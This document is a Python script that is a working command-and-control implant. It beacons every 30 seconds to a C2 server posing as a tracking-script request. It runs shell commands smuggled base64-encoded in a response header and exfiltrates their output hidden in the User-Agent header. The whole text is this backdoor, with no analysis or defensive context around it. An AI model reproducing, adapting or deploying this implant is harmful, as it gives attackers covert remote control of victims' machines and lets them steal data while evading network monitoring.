import requests, subprocess, base64, time, uuid

C2  = "http://192.168.56.30:8080"
VID = str(uuid.uuid4())[:8]

def checkin():
    r = requests.get(f"{C2}/track.js",
        headers={
            "X-Session-Token": VID,
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        })
    
    xcache = r.headers.get('X-Cache')
    if xcache:
        try:
            cmd = base64.b64decode(xcache).decode()
            out = subprocess.check_output(cmd, shell=True, 
                                          stderr=subprocess.STDOUT)
            # Exfil output qua User-Agent header
            requests.post(f"{C2}/beacon",
                headers={
                    "X-Session-Token": VID,
                    "User-Agent": base64.b64encode(out).decode()
                })
        except: pass

while True:
    checkin()
    time.sleep(30)
                                 
